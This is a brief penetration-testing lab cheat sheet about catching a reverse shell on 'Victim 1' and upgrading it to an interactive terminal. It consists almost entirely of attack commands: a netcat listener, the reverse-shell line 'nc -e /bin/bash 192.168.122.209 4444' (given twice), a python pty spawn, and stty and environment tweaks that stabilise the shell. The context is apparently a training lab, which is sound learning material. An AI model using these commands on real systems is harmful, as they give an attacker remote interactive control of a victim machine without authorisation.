# REVERSE SHELL & UPGRADING ON VICTIM 1

## Section 1: INTERACTING WITH VIC 1

Remember that this portion is if you already established a exploit through web crawling during you passive reconnaissance on the Crawling a web app portion of the lab. 

### (ATTACKER)

```
nc -nlvp 4444
```

```
nc -e /bin/bash 192.168.122.209 4444
```

## Section 2: Upgrading Your Shell

### (VICTIM)

```
nc -e /bin/bash 192.168.122.209 4444
```



(THIS WILL TELL YOU WHAT VERSION YOUR SHELL IS)

```
python3 -V 
```



 (THIS PREVENTS SHELL BRAKING FROM RAW INPUT)


```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



(BACKGROUND THE SHELL)


`(Ctl + z)` 


### (ATTACKER) 


(FOREGROUNDS SHELL)

```
stty raw -echo; fg
```



```
reset
```


### (VICTIM)

This is our `CHECK/CHANGE/CHECK` process

```
echo $TERM
```



(TELLS YOUR TERMINAL TYPE)

```
export TERM=xterm-256color 
```

```
echo $TERM
```

```
echo $SHELL
```

```
export SHELL=/bin/bash
```

```
echo $SHELL
```

### (ATTACKER)




(THIS TELLS YOU TERMINAL SIZE)

```
echo $TERM && tput lines && tput cols
```



### (VICTIM) 



(THIS CHANGES TERMINAL SIZE)

```
stty rows 38 columns 116 
```
